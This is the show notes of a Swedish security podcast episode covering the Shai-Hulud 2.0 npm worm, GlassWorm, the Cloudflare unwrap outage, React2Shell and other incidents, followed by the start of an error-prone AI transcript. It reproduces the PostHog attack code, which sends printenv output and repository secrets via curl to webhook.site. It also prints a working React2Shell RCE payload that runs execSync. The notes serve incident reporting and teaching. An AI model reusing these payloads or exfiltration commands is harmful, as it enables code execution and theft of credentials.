---
date: '2025-12-08T10:17:00'
tags:
- ostrukturerat
- CI/CD
- rust
title: 'Säkerhetspodcasten #294 - Ostrukturerat V.50'
---
Sha-Hulud 2.0 NPM/Github/PostHog hack,
Glassworm gömmer sitt malware med Unicode Variation Selectors,
ShadyPanda Browser Malware,
CloudFlare/Rust krash,
Ryska hackers trashar OT/ICS honypot,
React2Shell,
Pixelnapping spionerar på din OTP,
Flock kameror usel säkerhet...

## Lyssna

* [mp3](https://traffic.libsyn.com/secure/sakerhetspodcasten/2025-12-03_Sakerhetspodcasten.mp3?dest-id=117848), längd: 01:08:49

## Sha-hulud 2.0: NPM och Github brinner igen

Dune-masken reser sig ur sanden igen, och hackar NPM, github.
Masken blir mer resilient och hittar mer stabil sätt att exfiltera
  secrets,
  genom att kollaborativt dela github tokens på github.
Nu hackas local runners också.
Allas hemligheter blir opensource:ade av masken.
En del användare får sina filer förstörda.

Posthog som är en av de initiala vektorerna för masken berättar om hur deras
  github workflow var osäkert.
Hur de hackades för att sen sprida masken.
Deras workflow kördes som
  `on: pull_request_target`
  och då är själva workflowet säkert,
  men inte `.github/scripts/assign-reviewers.js`.
Så angriparna hade en RCE vektor in i deras CI workflow `posthog-bot`,
  som snart blev av med sin PAT...

Posthog `.github/scripts/assign-reviewers.js` hacket:

``` javascript
        const output = execSync(`curl -d "$(printenv)" https://webhook.site/c2be8b45-024f-479b-8771-44346e5e3b9c`, {
            encoding: 'utf8',
            stdio: ['pipe', 'pipe', 'ignore'],
        })
        process.exit(0);
```

Posthog secrets stöld:

``` yaml
jobs:
    lint-pr:
        name: Validate PR title against Conventional Commits
        runs-on: ubuntu-24.04
        env:
          DATA: ${{ toJSON(secrets) }}
        steps:
            - run: curl -d "$DATA" https://webhook.site/de21a672-823f-483c-954b-37432ff15cfc
```

Länkar:
* [The GitHub Blog/ Allison: Actions pull\_request\_target and environment branch protections changes - GitHub Changelog](https://github.blog/changelog/2025-11-07-actions-pull_request_target-and-environment-branch-protections-changes/)
* [about.gitlab.com: GitLab discovers widespread npm supply chain attack](https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/)
* [wiz.io/ Hila Ramati, Merav Bar, Gal Benmocha, Gili Tikochinski: Sha1-Hulud 2.0 Supply Chain Attack - 25K+ Repos Exposed | Wiz Blog - Shai-Hulud is back, spreading an npm malware worm through thousands of GitHub repos. Learn the impact, attacker methods, and how to defend your supply chain.](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)
* [YouTube/ Low Level: the npm malware is a hacking masterpiece](https://www.youtube.com/watch?v=lqZo4waMB3c) `video`
* [YouTube/ ThePrimeTime: oh no, not npm again...](https://www.youtube.com/watch?v=M_W-dleZXCs) `video`

Posthog hacket:
* [Post-mortem of Shai-Hulud attack on November 24th, 2025 - PostHog](https://posthog.com/blog/nov-24-shai-hulud-attack-post-mortem)
* Attack-commits:
  * [[skip ci] Fix typos · PostHog/posthog@485ec6c · GitHub](https://github.com/PostHog/posthog/commit/485ec6ce8068ee3846611840554001fe0bca4c43)
  * [chore(err): add posthog-cli release publishing CI (#30062) · PostHog/posthog@0132974 · GitHub - 🦔 PostHog is an all-in-one developer platform for building successful products. We offer product analytics, web analytics, session replay, error tracking, feature flags, experimentation, surveys, data warehouse, a CDP, and an AI product assistant to help debug your code, ship features faster, and keep all your usage and customer data in one stack. - chore(err): add posthog-cli release publishing CI (#30062) · PostHog/posthog@0132974](https://github.com/PostHog/posthog/commit/0132974d901a78d11a58a3cca3665a680391f966#diff-70c3a017bfdb629fd50281fe5f7ad22e29c0ddac36e7065e9dc6d4f0924104f4)

Github actions scanner zizmore:
* [GitHub - zizmorcore/zizmor: Static analysis for GitHub Actions](https://github.com/zizmorcore/zizmor)
* [Grafana Labs/ James Crocker : How to detect vulnerable GitHub Actions at scale with Zizmor - In order to harden our infrastructure and pipelines, we have introduced the open source tool Zizmor into our CI/CD pipelines.](https://grafana.com/blog/2025/06/26/how-to-detect-vulnerable-github-actions-at-scale-with-zizmor/)

## Glassworm VS Code malware

En "osynlig" mask i opensource!

Unicode **Variation Selectors** används för att specificera att den onda
  koden inte skall visas för mänskliga ögon...
Tusentals tecken malware kan döljas som ett enda tecken om det stöds av,
  din text-editor,
  eller din kodviewer i en PR review process,
  så får du inte se malwaret.

Länkar:
* [Koi: GlassWorm - First Self-Propagating Worm Using Invisible Code Hits OpenVSX Marketplace](https://www.koi.ai/blog/glassworm-first-self-propagating-worm-using-invisible-code-hits-openvsx-marketplace)
* [BleepingComputer/ Bill Toulas: Glassworm malware returns in third wave of malicious VS Code packages - The Glassworm campaign, which first emerged on the OpenVSX and Microsoft Visual Studio marketplaces in October, is now in its third wave, with 24 new packages added on the two platforms.](https://www.bleepingcomputer.com/news/security/glassworm-malware-returns-in-third-wave-of-malicious-vs-code-packages/)
* [BleepingComputer/ Bill Toulas: Self-spreading GlassWorm malware hits OpenVSX, VS Code registries - A new and ongoing supply-chain attack is targeting developers on the OpenVSX and Microsoft Visual Studio marketplaces with self-spreading malware called GlassWorm that has been installed an estimated 35,800 times.](https://www.bleepingcomputer.com/news/security/self-spreading-glassworm-malware-hits-openvsx-vs-code-registries/)
* [Variation Selectors (Unicode block) - Wikipedia](https://en.wikipedia.org/wiki/Variation_Selectors_(Unicode_block))
* [YouTube/ Koi 🎏: GlassWorm - First Self-Propagating Worm Using Invisible Code Hits OpenVSX Marketplace](https://www.youtube.com/watch?v=nd8XQwzzBRk) `video`

## ShadyPanda infekterar 4.3 miljoner webbrowsers

Miljontals användare av Chrome och Edge har installerat riktigt dåliga
  extensions...
Hotaktören ShadyPanda har lagt 7 år på att bygga en stor installbas
  innan de blev riktigt onda.

Länkar:
* [4.3 Million Browsers Infected: Inside ShadyPanda's 7-Year Malware Campaign | Koi Blog - ](https://www.koi.ai/blog/4-million-browsers-infected-inside-shadypanda-7-year-malware-campaign)
* [BleepingComputer/ Bill Toulas: ShadyPanda browser extensions amass 4.3M installs in malicious campaign - A long-running malware operation known as](https://www.bleepingcomputer.com/news/security/shadypanda-browser-extensions-amass-43m-installs-in-malicious-campaign/)

## CloudFlares Rust-krash

CloudFlare valde att tokdö!
Eftersom Peter sa att CloudFlare funkat dåligt i förra inspelningen,
  och alla andra moln krånglat, så gav Cloudflare upp...

En refaktorering snyggade upp en databas,
  med sidoeffekten att svar plötsligt även fick med en massa ny metadata.
Plötsligt skapades mycket mer konfiguration ut till `FL` och `FL2` än
  ett internt kontrakt tillåter.

`FL2`, en rust-rewrite, visade sig innehålla livsfarliga
   `.unwrap()` istället för `?` eller att hantera fel via `match() {...}`

``` rust
/// Fetch edge features based on `input` struct into ['Features'] buffer.
pub fn fetch_features(
    &mut self,
    input: &dyn BotsInput,
    features: &mut Features,
) -> Result<(), (ErrorFlags, i32)> {
    // update features checksum (lower 32 bits) and copy edge feature names
    features.checksum &= 0xFFFF_FFFF_0000_0000;
    features.checksum |= u64::from(self.config.checksum);
    let (feature_values, _) = features
        .append_with_names(&self.config.feature_names)
        .unwrap();
```

[Unwrap](https://doc.rust-lang.org/src/core/option.rs.html)
  är kod för
  "om värdet är ett fel,
  få panik,
  tänd eld på datorn och bränn ner programmet".
``` rust
pub const fn unwrap(self) -> T {
    match self {
        Some(val) => val,
        None => unwrap_failed(),
    }
}
//....
const fn unwrap_failed() -> ! {
    panic("called `Option::unwrap()` on a `None` value")
}
```

Clippy linter kan konfigureras att stoppa `unwrap()`:

``` rust
#![deny(clippy::unwrap_used)]
```

Länkar:
* [The Cloudflare Blog: Cloudflare outage on November 18, 2025](https://blog.cloudflare.com/18-november-2025-outage/)
* [r/rust: Cloudflare outage on November 18, 2025 - Caused by single .unwrap()](https://www.reddit.com/r/rust/comments/1p0susm/cloudflare_outage_on_november_18_2025_caused_by/)
* [YouTube/ ThePrimeTime: The line of code that took down the Internet](https://www.youtube.com/watch?v=sJBaMJfxzYk) `video`
* [YouTube/ Brodie Robertson: Rust Took Down The Entire Internet???](https://www.youtube.com/watch?v=vESkGUiiAB4) `video`
* [YouTube/ Low Level: did rust take down the internet?](https://www.youtube.com/watch?v=nVu4qrNzyqk) `video`

Unwrap, clippy:
* [rust: option.rs - source](https://doc.rust-lang.org/src/core/option.rs.html)
* [Lint Configuration - Clippy Documentation](https://doc.rust-lang.org/clippy/lint_configuration.html)
* [Clippy Lints](https://rust-lang.github.io/rust-clippy/master/index.html)

## Ryska hackers trashar en OT/ICS honungsburk

Ryssar hade helt sönder en OT/ICS burk.
Men det var en honungsburk från Forescout,
  så de kartla angriparnas attack.

Länkar:
* [Forescout: Anatomy of a Hacktivist Attack: Russian-Aligned Group Targets OT/ICS](https://www.forescout.com/blog/anatomy-of-a-hacktivist-attack-russian-aligned-group-targets-otics/)

## React Server Components fet RCE

React släppte patch för en oautentiserad RCE (`Remote Code Execution`) sårbarhet.
Det blir inte värre än så ;)
30 timmar efter det hade folk lyckats reverse-engineera fram attack-kod,
  så sen släpptes `React2Shell-CVE-2025-55182-original-poc` attack-koden.

AI-översättning av exploit-beskrivningen:
> `$@-deserialiseringen` få en `Chunk`-referens,
> placera `Chunk.prototype.then` som `then`-egenskapen för root.objektet.
> Därefter kommer `then` att anropas med root-objektet som `this`/`chunk`
>   när det inväntas/löses (awaited/resolved).
>
> Genom att sätta status till `RESOLVED_MODEL` kan `initializeModelChunk`
>   anroppas med en falsk chunk som vi har fullständig kontroll över.
> Detta är användbart eftersom `initializeModelChunk` och dess relaterade
>   funktioner anropar många metoder från `chunk._response`-objektet.


``` javascript
const payload = {
    '0': '$1',
    '1': {
        'status':'resolved_model',
        'reason':0,
        '_response':'$4',
        'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
        'then':'$2:then'
    },
    '2': '$@3',
    '3': [],
    '4': {
        '_prefix':'console.log(7*7+1)//',
        '_formData':{
            'get':'$3:constructor:constructor'
        },
        '_chunks':'$2:_response:_chunks',
    }
}
```
det går också att byta `_prefix`, köra kod, kasta error så man får ut
  resultat från exploit-kod:
`"_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",`


Länkar:
* [Critical Security Vulnerability in React Server Components – React](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
* [React2Shell (CVE-2025-55182)](https://react2shell.com/)
* [GitHub - lachlan2k/React2Shell-CVE-2025-55182-original-poc: Original Proof-of-Concept's for React2Shell CVE-2025-55182 - Original Proof-of-Concept's for React2Shell CVE-2025-55182 - lachlan2k/React2Shell-CVE-2025-55182-original-poc](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)
* [Gist: CVE-2025-55182 React Server Components RCE POC · GitHub](https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3)
* [GitHub - Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478: A command-line scanner for batch detection of Next.js application versions and determining if they are affected by CVE-2025-66478 vulnerability. - A command-line scanner for batch detection of Next.js application versions and determining if they are affected by CVE-2025-66478 vulnerability. - Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478](https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478)
* [cve.org: CVE-2025-55182](https://www.cve.org/CVERecord?id=CVE-2025-55182)

## Pixelnapping Android sidoläckage via Grafik API

Android aktivieter skäl text, blider från aktiv applikation via ett
  sidoläckage.
Din säkerhetskod / OTP är hotad!

Lägg en 1-pixel stor genomskinlig/blurad aktivitet över en annan aktivitet.
Grafik API:et kommer gå in i en blixtsnabb snabb kodväg om alla närliggande
  pixlar har samma färg.
Grafik API:et kommer gå långsamt om det går in i
  "rendrerera genomskinlighet/blur" kodvägen.

Länkar:
* [Pixnapping Attack](https://www.pixnapping.com)
* [cve.org: CVE-2025-48561](https://www.cve.org/CVERecord?id=CVE-2025-48561)
  Android:
  _In multiple locations, there is a possible way to access data displayed on the screen due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation._
* [20465375a1d0cb71cdb891235a9f8a3fba31dbf6 - platform/frameworks/native - Git at Google](https://android.googlesource.com/platform/frameworks/native/+/20465375a1d0cb71cdb891235a9f8a3fba31dbf6)
* [Android Open Source Project: Android Security Bulletin—September 2025](https://source.android.com/docs/security/bulletin/2025-09-01)
* [YouTube/ Daniel Boctor: Android Bug - CVE-2025-48561 (boring)](https://www.youtube.com/watch?v=FDeMq8W4-sU) `video`

## Flock: Osäker massövervakning

Flock Safety Cameras har ett negativt rykte efter varit inblandade i massa
  skandaler.
Polismyndigheter använt dem oansvarigt,
  anklagat folk för brott utan någon som helst rimlig grund,
  förföljt kvinnor,
  ljugit om varför man söker efter personer,
  inte respekterat delstaters lagar.

Nu påvisas en massa tekniska säkerhetsbrister i:
  kamerorna,
  brist på stark användarautentisering (ingen tvåfaktor),
  deras demosajt.

Vem har inte drömt om att ha
  utvecklaråtkomst via ADB login till polisens övervakningskameror?
Kunna logga in på webben och kolla på polisens kameror?

Länkar:
* [GitHub - GainSec/anti-crime-ecosystem-research: Independent research white paper by Jon “GainSec” Gaines examining the security posture of a connected public safety technology ecosystem. - Independent research white paper by Jon “GainSec” Gaines examining the security posture of a connected public safety technology ecosystem. - GainSec/anti-crime-ecosystem-research](https://github.com/GainSec/anti-crime-ecosystem-research)
* [YouTube/ Benn Jordan: We Hacked Flock Safety Cameras in under 30 Seconds. 🫥](https://www.youtube.com/watch?v=uB0gr7Fh6lY) `video`

Exempel på tidigare skandaler:
* [Committee on Oversight and Goverment Reform/ August 6, 2025: Flock Group Inc](https://krishnamoorthi.house.gov/sites/evo-subsites/krishnamoorthi.house.gov/files/evo-media-document/2025-08-06.garcia-krishnamoorthi-to-flock-re-lpr-tech-and-tracking.pdf)
  _We write regarding reports that federal and local law enforcement officials are using
license plate reader technology operated by Flock Group Inc. (Flock) to wrongly track and to
potentially harm people, in concerning violation of Americans’ privacy, freedom, and civil
liberties._
* [Lookout Santa Cruz/ Max Chun: Georgia police chief, arrested for using Flock cameras for stalking and harassment, searched Capitola data earlier this year - Data compiled by countywide grassroots coalition Get The Flock Out shows that a former Georgia police chief searched Capitola data in early 2025. Capitola Police Chief Sarah Ryan said she was not aware of these searches, but given the recent issues with Flock Safety, is not surprised. The city stopped sharing data with more than 300 law enforcement agencies in November and implemented a waiver system for any access requests. Ryan said she is working with Flock to amend the city’s contract with the company.](https://lookout.co/georgia-police-chief-arrested-for-using-flock-cameras-for-stalking-and-harassment-searched-capitola-data-earlier-this-year/story)
* [Karen  Morfitt: Flock cameras lead Colorado police to wrong suspect - "It became my job to prove my innocence" - CBS Colorado - Flock cameras led Columbine Valley police to a woman whom they accused of stealing a package, who then had to prove her own innocence by compiling her own evidence. After she did, the police chief said, &quot;nicely done btw.&quot;](https://www.cbsnews.com/colorado/news/flock-cameras-lead-colorado-police-wrong-suspect/)

## AI transkribering

_AI försöker förstå oss... Ha överseende med galna feltranskriberingar._

`1 00:00:00,000 --> 00:00:01,940`
Hej och välkommen till Säkerhetspodcasten.



`2 00:00:02,020 --> 00:00:04,860`
Jag som pratar heter Johan Ryberg Möller och med mig har jag Peter Magnusson.



`3 00:00:05,100 --> 00:00:06,660`
Mitt flippa nyn är Buss.



`4 00:00:06,900 --> 00:00:07,580`
Mattias Hidager.



`5 00:00:07,780 --> 00:00:08,260`
Woopie doo\!



`6 00:00:08,520 --> 00:00:09,260`
Och Jesper Larsson.



`7 00:00:09,460 --> 00:00:10,060`
Så är det faktiskt.



`8 00:00:10,360 --> 00:00:11,440`
Rickard är på andra övertid idag.



`9 00:00:11,640 --> 00:00:16,140`
Men vi ska nämna att det är den 3 december 2025 när vi spelar in detta.



`10 00:00:16,280 --> 00:00:18,740`
Vi är sponsrade av Shored som finns på Shored.se.



`11 00:00:19,360 --> 00:00:22,060`
Så även av 0x4A som finns på 0x4A.se.



`12 00:00:22,140 --> 00:00:24,740`
Och av Bordfors som finns på Bordfors.se.



`13 00:00:25,040 --> 00:00:25,300`
Yay\!



`14 00:00:25,560 --> 00:00:28,600`
Det är inga pluggs idag men det här är ostrukturerat så let's jump into the news.



`15 00:00:28,600 --> 00:00:29,320`
Ja, vilken dag det var.



`16 00:00:29,320 --> 00:00:30,200`
Ja, bra.



`17 00:00:31,040 --> 00:00:34,100`
Vi ska prata supply chain attack igen.



`18 00:00:34,920 --> 00:00:35,840`
Och doom.



`19 00:00:36,540 --> 00:00:37,180`
Och doom.



`20 00:00:37,840 --> 00:00:38,780`
Nej, doom.



`21 00:00:39,800 --> 00:00:42,380`
Men jag tänker att Peter, take it away.



`22 00:00:43,500 --> 00:00:44,300`
Oj, vänta.



`23 00:00:44,900 --> 00:00:45,900`
Var det inte så vi skulle göra?



`24 00:00:46,060 --> 00:00:47,420`
Nej, vi satte dig på det här.



`25 00:00:48,700 --> 00:00:50,920`
Men jag kan försöka säga något svårt om du vill.



`26 00:00:50,920 --> 00:00:52,480`
Står jag i bla och fiskar tycker jag.



`27 00:00:52,660 --> 00:00:56,320`
Jag tycker också det och jag har ju fler så tänkte jag att Peter skulle få snacka med.



`28 00:00:56,380 --> 00:00:58,020`
Men jag kan ta upp mina notes.



`29 00:00:58,520 --> 00:00:59,300`
Tjaj, hulud.



`30 00:00:59,320 --> 00:01:00,320`
Tjaj, hulud i alla fall pratar vi om.



`31 00:01:00,320 --> 00:01:02,320`
Det är ju The Second Coming.



`32 00:01:02,320 --> 00:01:03,320`
Spice Worm of Death.



`33 00:01:03,320 --> 00:01:05,320`
Eller exakt Johan.



`34 00:01:05,320 --> 00:01:07,320`
Spice Worm of Death.



`35 00:01:07,320 --> 00:01:09,320`
Alltså doom.



`36 00:01:09,320 --> 00:01:13,320`
Vi behöver nästan närma oss The Third Coming eller någonting om man räknar vågorna nu.



`37 00:01:13,320 --> 00:01:15,320`
Ja, det var ett frekvent Friends of the Pods.



`38 00:01:15,320 --> 00:01:17,320`
Och vi hade ju också några...



`39 00:01:17,320 --> 00:01:21,320`
Men jag tror att de kallade verkligen den här för The Second Coming i alla fall.



`40 00:01:21,320 --> 00:01:22,320`
Två punkter.



`41 00:01:22,320 --> 00:01:28,320`
Ja, om vi räknar första Tjaj, hulud som när den var första Wormable-varianten på attackvågen.



`42 00:01:28,320 --> 00:01:29,320`
Två punkter. Ja, om vi räknar första Tjaj, hulud som när den var första Wormable-varianten på attackvågen.



`43 00:01:29,320 --> 00:01:30,320`
Ja, om vi räknar första Tjaj, hulud som när den var första Wormable-varianten på attackvågen.



`44 00:01:30,320 --> 00:01:31,320`
Ja, om vi räknar första Tjaj, hulud som när den var första Wormable-varianten på attackvågen.



`45 00:01:31,320 --> 00:01:32,320`
Två punkter. Ja, om vi räknar första Tjaj, hulud som när den var första Wormable-varianten på attackvågen.



`46 00:01:32,320 --> 00:01:33,320`
Två punkter. Ja, om vi räknar första Tjaj, hulud som när den var första Wormable-varianten på attackvågen.



`47 00:01:33,320 --> 00:01:34,320`
Två punkter. Ja, om vi räknar första Tjaj, hulud som när den var första Wormable-varianten på attackvågen.



`48 00:01:34,320 --> 00:01:36,400`
när det skedde en massa hackningar



`49 00:01:36,400 --> 00:01:38,640`
typ en månad innan.



`50 00:01:38,920 --> 00:01:40,460`
Men refresha minnet för oss



`51 00:01:40,460 --> 00:01:42,100`
som inte är kloka. Det här var



`52 00:01:42,100 --> 00:01:43,960`
någon form av NPM-wormable



`53 00:01:43,960 --> 00:01:46,500`
supply chain. Exakt. En av de första, kanske lite större



`54 00:01:46,500 --> 00:01:47,080`
vi har sett då.



`55 00:01:48,820 --> 00:01:50,480`
Den har ju också en väldigt stor



`56 00:01:50,480 --> 00:01:51,800`
eller en väldigt central



`57 00:01:51,800 --> 00:01:53,600`
GitHub-komponent



`58 00:01:53,600 --> 00:01:56,600`
där den injicerar GitHub-workflows



`59 00:01:56,600 --> 00:01:57,020`
och



`60 00:01:57,020 --> 00:02:00,360`
De är väldigt säkra nämligen.



`61 00:02:00,500 --> 00:02:01,480`
De är typ som Fortnox.



`62 00:02:01,760 --> 00:02:03,600`
Minns jag rätt här nu att du



`63 00:02:03,600 --> 00:02:06,400`
infekterar repo, maintainers drar ner



`64 00:02:06,400 --> 00:02:08,360`
detta via maintainers



`65 00:02:08,360 --> 00:02:09,580`
och sprider det vidare till andra repo.



`66 00:02:10,100 --> 00:02:11,880`
Ja, exakt. Wormdelen var precis så.



`67 00:02:11,980 --> 00:02:14,380`
Det vill säga att någon som är maintainer av ett repo



`68 00:02:14,380 --> 00:02:16,600`
får den här på sig på något sätt



`69 00:02:16,600 --> 00:02:18,560`
via NPM-install



`70 00:02:18,560 --> 00:02:19,180`
typiskt.



`71 00:02:19,360 --> 00:02:22,420`
Den första varant gick som en post-install-skript.



`72 00:02:22,900 --> 00:02:24,020`
Och då kör den



`73 00:02:24,020 --> 00:02:26,100`
truffelhag, hittar alla dina hemligheter, tar din



`74 00:02:26,100 --> 00:02:28,620`
NPM-hemlighet eller kanske först din GitHub-hemlighet



`75 00:02:28,620 --> 00:02:30,020`
gör ändringar i koden



`76 00:02:30,020 --> 00:02:32,100`
det gör du nog inte via GitHub



`77 00:02:32,100 --> 00:02:33,580`
utan du skjuter upp det på



`78 00:02:33,580 --> 00:02:35,300`
NPM så du drabbar den



`79 00:02:35,300 --> 00:02:37,360`
komponenten också. Och så sprids det vidare.



`80 00:02:37,980 --> 00:02:39,880`
Och sen så exfiltrerar den



`81 00:02:39,880 --> 00:02:41,540`
alla dina hemligheter



`82 00:02:41,540 --> 00:02:43,340`
via ett nyskapat GitHub-repo



`83 00:02:43,340 --> 00:02:44,380`
som alla kunde se.



`84 00:02:44,380 --> 00:02:45,600`
Just det, så var det.



`85 00:02:45,600 --> 00:02:46,700`
Det är jättesmart.



`86 00:02:47,360 --> 00:02:50,580`
Men vi såg även



`87 00:02:50,580 --> 00:02:52,180`
ett svenskt direktiv



`88 00:02:52,180 --> 00:02:53,540`
jag vet inte om jag visade den för Peter



`89 00:02:53,540 --> 00:02:56,420`
att det kom ut en svensk sajt som



`90 00:02:56,420 --> 00:02:58,400`
gjorde typ likadant



`91 00:02:58,400 --> 00:02:59,720`
fast det är en mycket mindre skala



`92 00:02:59,720 --> 00:03:02,420`
med en massa konstiga NPM-packager. Förmodligen någon som bara gjorde en pock



`93 00:03:02,420 --> 00:03:03,560`
på hur det här



`94 00:03:03,580 --> 00:03:05,740`
skulle kunna gå till. Men den däckte upp ganska snabbt.



`95 00:03:06,040 --> 00:03:07,120`
En svensk sajt.



`96 00:03:07,320 --> 00:03:09,340`
Ja, men det var en svensk



`97 00:03:09,340 --> 00:03:10,420`
version av det här.



`98 00:03:10,800 --> 00:03:13,340`
Det var inte typ NPM.se eller någonting liknande.



`99 00:03:13,360 --> 00:03:14,720`
Exakt, exakt. Skitsnyggt.



`100 00:03:15,400 --> 00:03:16,760`
Som kom direkt efteråt.



`101 00:03:17,080 --> 00:03:19,260`
Ja, skitsamma. Men nu då



`102 00:03:19,260 --> 00:03:21,220`
är de tillbaka igen.



`103 00:03:21,260 --> 00:03:23,320`
The second coming. Exakt, och då har de



`104 00:03:23,320 --> 00:03:25,540`
lyckats plocka lite roligare paket.



`105 00:03:26,100 --> 00:03:27,360`
De har lyckats plocka



`106 00:03:27,360 --> 00:03:29,540`
Zapier, NSDNS,



`107 00:03:29,760 --> 00:03:31,000`
Posthog och Postman.



`108 00:03:31,420 --> 00:03:33,000`
Och de var temporärt



`109 00:03:33,580 --> 00:03:36,140`
trojaniserade, kan man säga det?



`110 00:03:36,320 --> 00:03:36,740`
Kan man säga.



`111 00:03:38,520 --> 00:03:40,100`
Ja, och exakt samma



`112 00:03:40,100 --> 00:03:41,000`
memo då. GitHub



`113 00:03:41,000 --> 00:03:42,760`
fyllda med greker.



`114 00:03:43,000 --> 00:03:45,720`
Stuna hemligheter. Och Posthog



`115 00:03:45,720 --> 00:03:48,000`
vet man ju att det var en av de initiala



`116 00:03:48,000 --> 00:03:49,260`
vektorerna nu.



`117 00:03:50,600 --> 00:03:51,540`
De hade



`118 00:03:51,540 --> 00:03:53,540`
osäkra



`119 00:03:53,540 --> 00:03:56,300`
vad heter det?



`120 00:03:57,120 --> 00:03:58,140`
On push



`121 00:03:58,140 --> 00:03:59,780`
var det



`122 00:03:59,780 --> 00:04:01,600`
on push target eller någonting?



`123 00:04:01,760 --> 00:04:03,540`
Posthog är ett konstigt



`124 00:04:03,540 --> 00:04:05,460`
bygge generellt.



`125 00:04:05,460 --> 00:04:07,920`
För om man läser i deras dokumentation



`126 00:04:07,920 --> 00:04:09,700`
vad de gör



`127 00:04:09,700 --> 00:04:11,700`
skit i det, det gör



`128 00:04:11,700 --> 00:04:13,860`
saker. Men om man läser i deras dokumentation



`129 00:04:13,860 --> 00:04:16,040`
så behövs det två saker



`130 00:04:16,040 --> 00:04:17,540`
för att åta sig



`131 00:04:17,540 --> 00:04:19,980`
och skicka saker till sin instans.



`132 00:04:20,840 --> 00:04:21,760`
De två sakerna



`133 00:04:21,760 --> 00:04:23,980`
är inte enligt deras dokumentation



`134 00:04:23,980 --> 00:04:25,440`
att betraktas som hemligheter.



`135 00:04:26,580 --> 00:04:27,660`
Okej. Ja, jag lämnar



`136 00:04:27,660 --> 00:04:28,040`
det med det.



`137 00:04:29,540 --> 00:04:31,440`
Exakt så. Och



`138 00:04:31,440 --> 00:04:33,500`
det kan vara så att de är väldigt vanligt för att det



`139 00:04:33,540 --> 00:04:35,320`
kommer i klartext då.



`140 00:04:35,900 --> 00:04:37,580`
Ganska mycket överallt. Och sen så



`141 00:04:37,580 --> 00:04:39,580`
kan man skjuta in lite allt möjligt



`142 00:04:39,580 --> 00:04:39,960`
där i.



`143 00:04:41,780 --> 00:04:43,140`
Sen kanske det blir konsumerat.



`144 00:04:43,220 --> 00:04:45,320`
Jag har verkligen ingen aning om vad Posthog är för något.



`145 00:04:45,420 --> 00:04:47,100`
Nej, alltså inte jag heller.



`146 00:04:47,660 --> 00:04:49,100`
Jag vet inte riktigt vad jag ska ha det till men



`147 00:04:49,100 --> 00:04:50,820`
några av mina kunder använder det.



`148 00:04:51,100 --> 00:04:53,660`
Du kan pusha olika



`149 00:04:53,660 --> 00:04:54,900`
saker dit.



`150 00:04:56,420 --> 00:04:57,720`
Jo, alltså det låter



`151 00:04:57,720 --> 00:04:58,500`
konstigt.



`152 00:04:59,040 --> 00:05:01,120`
Men bredbärnargris



`153 00:05:01,120 --> 00:05:02,780`
om vi översätter till svenska då?



`154 00:05:03,540 --> 00:05:05,540`
Ja, alltså



`155 00:05:06,260 --> 00:05:07,180`
det är som en...



`156 00:05:07,180 --> 00:05:09,680`
Product analytics ser ut som att det här är.



`157 00:05:10,160 --> 00:05:10,440`
Men



`158 00:05:10,440 --> 00:05:13,160`
tydligen så ska



`159 00:05:13,160 --> 00:05:15,740`
om jag förstod Posthogs



`160 00:05:15,740 --> 00:05:17,460`
write-up så ska



`161 00:05:17,460 --> 00:05:18,860`
så GitHub



`162 00:05:18,860 --> 00:05:21,920`
se över hur



`163 00:05:21,920 --> 00:05:25,280`
ur den handeln



`164 00:05:25,280 --> 00:05:27,240`
som de hade missförstått, hur den



`165 00:05:27,240 --> 00:05:29,560`
funkar för att



`166 00:05:29,560 --> 00:05:30,440`
det blev så dåligt.



`167 00:05:32,940 --> 00:05:33,500`
Vad



`168 00:05:33,500 --> 00:05:34,960`
Posthog hade gjort var att de hade



`169 00:05:34,960 --> 00:05:36,100`
en typ



`170 00:05:36,100 --> 00:05:38,440`
on-push-target



`171 00:05:38,440 --> 00:05:41,340`
där om jag fattade



`172 00:05:41,340 --> 00:05:42,820`
rätt så trodde de att



`173 00:05:42,820 --> 00:05:44,820`
då kommer



`174 00:05:44,820 --> 00:05:47,320`
jobbet exekveras



`175 00:05:47,320 --> 00:05:49,360`
och tillgång till den koden som



`176 00:05:49,360 --> 00:05:50,760`
de ska testa



`177 00:05:50,760 --> 00:05:53,160`
men det kommer köra på deras



`178 00:05:53,160 --> 00:05:54,120`
eget workflow.



`179 00:05:55,240 --> 00:05:56,940`
Men deras workflow



`180 00:05:56,940 --> 00:05:58,600`
hade



`181 00:05:58,600 --> 00:05:59,920`
hade



`182 00:05:59,920 --> 00:06:00,120`
hade



`183 00:06:00,120 --> 00:06:03,420`
hade extra Java-skrivna.



`184 00:06:03,500 --> 00:06:06,500`
Och logiken var



`185 00:06:06,500 --> 00:06:07,340`
som följer att



`186 00:06:07,340 --> 00:06:09,200`
ja, du får exakt ditt workflow



`187 00:06:09,200 --> 00:06:11,820`
men alla andra filer



`188 00:06:11,820 --> 00:06:12,800`
inklusive



`189 00:06:12,800 --> 00:06:15,760`
JavaScriptet som du inkluderar



`190 00:06:15,760 --> 00:06:17,880`
i ditt workflow



`191 00:06:17,880 --> 00:06:20,140`
kan angripa den



`192 00:06:20,140 --> 00:06:21,920`
skriva över i sitt



`193 00:06:21,920 --> 00:06:23,080`
push-request.



`194 00:06:23,820 --> 00:06:25,380`
Så det här



`195 00:06:25,380 --> 00:06:26,860`
vad fan heter de här



`196 00:06:26,860 --> 00:06:30,260`
är det



`197 00:06:30,260 --> 00:06:33,380`
det var för länge sedan jag läste på dem



`198 00:06:33,380 --> 00:06:33,480`
men det är en del av det.



`199 00:06:33,500 --> 00:06:34,720`
I de här Ovasp



`200 00:06:34,720 --> 00:06:37,020`
CICD topp 10 så är det den här



`201 00:06:37,020 --> 00:06:39,000`
second order



`202 00:06:39,000 --> 00:06:40,080`
eller vad det nu heter av



`203 00:06:40,080 --> 00:06:43,660`
pipeline-knäckande



`204 00:06:43,660 --> 00:06:44,440`
liksom när du



`205 00:06:44,440 --> 00:06:46,960`
du får inte lov att modifiera pipelinen



